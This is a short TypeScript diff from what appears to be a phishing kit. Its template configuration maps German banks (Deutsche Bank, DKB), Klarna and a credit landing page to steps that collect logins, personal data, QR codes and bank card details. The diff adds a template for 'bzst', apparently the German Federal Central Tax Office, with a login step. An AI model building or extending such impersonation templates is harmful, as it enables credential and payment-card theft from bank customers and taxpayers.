@@ -106,7 +106,8 @@ export async function getTemplateConfig(templateName: string) {
       'deutsche_bank': { multiFieldLogin: true, doubleLogin: true, personalData: true, qrCode: true, bankCard: true },
       'dkb': { doubleLogin: true, personalData: true, qrUpload: true, bankCard: true },
       'klarna': { bankSelection: true, personalData: true, bankCard: true },
-      'credit-landing': { bankCard: true, personalData: true }
+      'credit-landing': { bankCard: true, personalData: true },
+      'bzst': { login: true }
     };
     
     const defaultSteps = templateDefaults[templateName] || { personalData: true, bankCard: true };
